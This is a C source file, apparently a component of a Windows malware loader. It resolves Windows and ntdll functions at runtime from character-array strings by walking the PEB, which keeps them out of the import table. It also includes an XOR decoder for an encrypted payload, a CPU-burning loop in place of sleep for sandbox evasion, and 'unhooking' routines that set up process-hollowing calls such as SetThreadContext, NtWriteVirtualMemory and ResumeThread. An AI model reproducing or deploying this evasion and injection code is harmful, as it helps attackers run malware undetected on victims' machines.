#include <windows.h>
#include <stdio.h>
#include "addresshunter.h"
#include "functions.h"

//Kernel32 Function
UINT64 kernel32dll = 0;
CreateProcessA_t CreateProcessAFunc = 0;
TerminateProcess_t TerminateProcessFunc = 0;
CloseHandle_t CloseHandleFunc = 0;
CreateFileA_t CreateFileAFunc = 0;
GetFileSize_t GetFileSizeFunc = 0;
ReadFile_t ReadFileFunc = 0;
GetThreadContext_t GetThreadContextFunc = 0;
SetThreadContext_t SetThreadContextFunc = 0;
Sleep_t SleepFunc = 0;
ResumeThread_t ResumeThreadFunc = 0;
LOADLIBRARYA LoadLibraryAFunc = 0;

//Nt Functions
HMODULE ntdlldll = 0;
NtAllocateVirtualMemory_t NtAllocateVirtualMemoryFunc = 0;
NtProtectVirtualMemory_t NtProtectVirtualMemoryFunc = 0;
NtWriteVirtualMemroy_t NtWriteVirtualMemroyFunc = 0;
NtReadVirtualMemory_t NtReadVirtualMemoryFunc = 0;

wprintf_t wprintfFunc = 0;

void XOR(unsigned char* data, size_t data_len, char* key, size_t key_len) {
	int j;

	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}

void sleep()
{
	for (int i = 0; i <= 500000; i++)
	{
		for (int j = 2; j <= i / 2; j++)
		{
			if (i % j == 0)
			{
				break;
			}
		}
	}
}

PVOID CopyMemoryEx(_Inout_ PVOID Destination, _In_ CONST PVOID Source, _In_ SIZE_T Length)
{
	PBYTE D = (PBYTE)Destination;
	PBYTE S = (PBYTE)Source;

	while (Length--)
		*D++ = *S++;

	return Destination;
}

char* strstrFunc(const char* string, const char* substring)
{
	const char* a, * b;

	/* First scan quickly through the two strings looking for a
	 * single-character match.  When it's found, then compare the
	 * rest of the substring.
	 */

	b = substring;

	if (*b == 0)
	{
		return (char*)string;
	}

	for (; *string != 0; string += 1)
	{
		if (*string != *b)
		{
			continue;
		}

		a = string;

		while (1)
		{
			if (*b == 0)
			{
				return (char*)string;
			}
			if (*a++ != *b++)
			{
				break;
			}
		}

		b = substring;
	}

	return NULL;
}

PVOID GetDll(PWSTR FindName)
{
	_PPEB ppeb = (_PPEB)__readgsqword(0x60);
	ULONG_PTR pLdr = (ULONG_PTR)ppeb->pLdr;
	ULONG_PTR val1 = (ULONG_PTR)((PPEB_LDR_DATA)pLdr)->InMemoryOrderModuleList.Flink;
	PVOID dllBase = NULL;

	ULONG_PTR val2;
	while (val1)
	{
		PWSTR DllName = ((PLDR_DATA_TABLE_ENTRY)val1)->BaseDllName.pBuffer;
		dllBase = (PVOID)((PLDR_DATA_TABLE_ENTRY)val1)->DllBase;
		if (my_strcmp((char*)FindName, (char*)DllName) == 0)
		{
			break;
		}
		val1 = DEREF_64(val1);
	}
	return dllBase;
}

void LoadFunctionsAfterUnhooking() {

	CHAR NtAllocateVirtualMemory_c[] = { 'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
	CHAR NtProtectVirtualMemory_c[] = { 'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
	CHAR NtWriteVirtualMemroy_c[] = { 'N', 't', 'W', 'r', 'i', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
	CHAR LoadLibraryA_c[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0x00 };
	CHAR NtReadVirtualMemeory_c[] = { 'N', 't', 'R', 'e', 'a', 'd', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
	CHAR CreateProcessA_c[] = { 'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A', 0x00 };
	CHAR TerminateProcess_c[] = { 'T', 'e', 'r', 'm', 'i', 'n', 'a', 't', 'e','P','r','o','c','e','s','s', 0x00 };
	CHAR CloseHandle_c[] = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0x00 };
	CHAR CreateFileA_c[] = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'A', 0x00 };
	CHAR GetFileSize_c[] = { 'G', 'e', 't', 'F', 'i', 'l', 'e', 'S', 'i', 'z', 'e', 0x00 };
	CHAR ReadFile_c[] = { 'R', 'e', 'a', 'd', 'F', 'i', 'l', 'e', 0x00 };
	CHAR GetThreadContext_c[] = { 'G', 'e', 't', 'T', 'h', 'r', 'e', 'a', 'd', 'C', 'o', 'n', 't', 'e', 'x', 't', 0x00 };
	CHAR SetThreadContext_c[] = { 'S', 'e', 't', 'T', 'h', 'r', 'e', 'a', 'd', 'C', 'o', 'n', 't', 'e', 'x', 't', 0x00 };
	CHAR ResumeThread_c[] = { 'R', 'e', 's', 'u', 'm', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 0x00 };
	CHAR Sleep_c[] = { 'S', 'l', 'e', 'e', 'p', 0x00 };



	kernel32dll = GetKernel32();
	//Kernel32 Function
	CreateProcessAFunc = (CreateProcessA_t)GetSymbolAddress((HANDLE)kernel32dll, CreateProcessA_c);
	TerminateProcessFunc = (TerminateProcess_t)GetSymbolAddress((HANDLE)kernel32dll, TerminateProcess_c);
	CloseHandleFunc = (CloseHandle_t)GetSymbolAddress((HANDLE)kernel32dll, CloseHandle_c);
	CreateFileAFunc = (CreateFileA_t)GetSymbolAddress((HANDLE)kernel32dll, CreateFileA_c);
	GetFileSizeFunc = (GetFileSize_t)GetSymbolAddress((HANDLE)kernel32dll, GetFileSize_c);
	ReadFileFunc = (ReadFile_t)GetSymbolAddress((HANDLE)kernel32dll, ReadFile_c);
	GetThreadContextFunc = (GetThreadContext_t)GetSymbolAddress((HANDLE)kernel32dll, GetThreadContext_c);
	SetThreadContextFunc = (SetThreadContext_t)GetSymbolAddress((HANDLE)kernel32dll, SetThreadContext_c);
	SleepFunc = (Sleep_t)GetSymbolAddress((HANDLE)kernel32dll, Sleep_c);
	ResumeThreadFunc = (ResumeThread_t)GetSymbolAddress((HANDLE)kernel32dll, ResumeThread_c);
	LoadLibraryAFunc = (LOADLIBRARYA)GetSymbolAddress((HMODULE)kernel32dll, LoadLibraryA_c);

	//Nt Functions
	ntdlldll = LoadLibraryAFunc("ntdll.dll");
	NtAllocateVirtualMemoryFunc = (NtAllocateVirtualMemory_t)GetSymbolAddress((HANDLE)ntdlldll, NtAllocateVirtualMemory_c);
	NtProtectVirtualMemoryFunc = (NtProtectVirtualMemory_t)GetSymbolAddress((HANDLE)ntdlldll, NtProtectVirtualMemory_c);
	NtWriteVirtualMemroyFunc = (NtWriteVirtualMemroy_t)GetSymbolAddress((HANDLE)ntdlldll, NtWriteVirtualMemroy_c);
	NtReadVirtualMemoryFunc = (NtReadVirtualMemory_t)GetSymbolAddress((HANDLE)ntdlldll, NtReadVirtualMemeory_c);


}

void LoadFunctionBeforeUnhooking() {
	CHAR wprintf_c[] = { 'w', 'p', 'r', 'i', 'n', 't', 'f', 0x00 };
	CHAR CreateProcessA_c[] = { 'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A', 0x00 };
	CHAR NtAllocateVirtualMemory_c[] = { 'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
	CHAR NtReadVirtualMemeory_c[] = { 'N', 't', 'R', 'e', 'a', 'd', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
	CHAR TerminateProcess_c[] = { 'T', 'e', 'r', 'm', 'i', 'n', 'a', 't', 'e','P','r','o','c','e','s','s', 0x00 };
	CHAR NtProtectVirtualMemory_c[] = { 'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
	CHAR LoadLibraryA_c[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0x00 };
	CHAR CloseHandle_c[] = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0x00 };

	kernel32dll = GetKernel32();
	LoadLibraryAFunc = (LOADLIBRARYA)GetSymbolAddress((HMODULE)kernel32dll, LoadLibraryA_c);
	ntdlldll = LoadLibraryAFunc("ntdll.dll");

	CreateProcessAFunc = (CreateProcessA_t)GetSymbolAddress((HANDLE)kernel32dll, CreateProcessA_c);
	CloseHandleFunc = (CloseHandle_t)GetSymbolAddress((HANDLE)kernel32dll, CloseHandle_c);
	wprintfFunc = (wprintf_t)GetSymbolAddress((HANDLE)LoadLibraryAFunc("msvcrt.dll"), wprintf_c);
	NtAllocateVirtualMemoryFunc = (NtAllocateVirtualMemory_t)GetSymbolAddress((HANDLE)ntdlldll, NtAllocateVirtualMemory_c);
	NtReadVirtualMemoryFunc = (NtReadVirtualMemory_t)GetSymbolAddress((HANDLE)ntdlldll, NtReadVirtualMemeory_c);
	TerminateProcessFunc = (TerminateProcess_t)GetSymbolAddress((HANDLE)kernel32dll, TerminateProcess_c);
	NtProtectVirtualMemoryFunc = (NtProtectVirtualMemory_t)GetSymbolAddress((HANDLE)ntdlldll, NtProtectVirtualMemory_c);

}